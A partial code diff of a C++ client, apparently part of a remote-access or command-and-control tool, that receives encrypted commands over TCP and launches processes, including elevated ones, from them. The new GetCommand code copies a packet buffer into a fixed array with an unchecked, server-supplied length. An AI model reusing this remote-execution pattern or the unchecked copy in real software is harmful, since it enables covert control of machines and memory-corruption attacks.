@@ -171,7 +171,7 @@ BOOL Client::PerformCommand(const ServerCommand& command, ClientResponse& outRes
 	case RemoteAction::kOpenRemoteProcess:
 	case RemoteAction::KOpenElevatedProcess:
 		CLIENT_DBG("opening elevated process");
-		std::string normal = Serialization::BytestringToString(command.commandLineArguments);
+		std::string normal = command.buffer;
 		std::wstring args = std::wstring(normal.begin(), normal.end());
 
 		STARTUPINFO si = { 0 };
@@ -297,14 +297,21 @@ BOOL Client::SendMessageToServer(std::string message, BOOL encrypted) {
 }
 
 BYTESTRING Client::GetCommand() {
-	BYTESTRING received;
+	BYTESTRING received; // encrypted packet struct 
 	NetCommon::ReceiveData(received, this->m_TCPSocket, TCP);
-	BYTESTRING decrypted = LGCrypto::RSADecrypt(received, this->m_RequestSecrets.priv, TRUE);
-	std::string dbg = "decrypted size : " + std::to_string(decrypted.size()) + "\n";
-	CLIENT_DBG(dbg.c_str());
-	std::string deserialized = Serialization::BytestringToString(decrypted);
-	CLIENT_DBG(deserialized.c_str());
-	std::wstring wstr(deserialized.begin(), deserialized.end());
+	BYTESTRING decrypted = LGCrypto::RSADecrypt(received, this->m_RequestSecrets.priv, TRUE); // serialized packet struct
+	Packet packet = Serialization::DeserializeToStruct<Packet>(decrypted); // deserialized Packet Struct
+	//std::string command = Serialization::BytestringToString(packet.command);
+	//std::string dbg = "decrypted size : " + std::to_string(decrypted.size()) + "\n";
+	//CLIENT_DBG(dbg.c_str());
+	//std::string deserialized = Serialization::BytestringToString(decrypted);
+	//CLIENT_DBG(command.c_str());
+	char command[MAX_BUFFER_LEN];
+	memcpy(command, packet.buffer, packet.buffLen);
+	command[packet.buffLen] = '\0';
+	CLIENT_DBG(command);
+
+	std::wstring wstr;
 
 	STARTUPINFO			si = { 0 };
 	PROCESS_INFORMATION pi = { 0 };
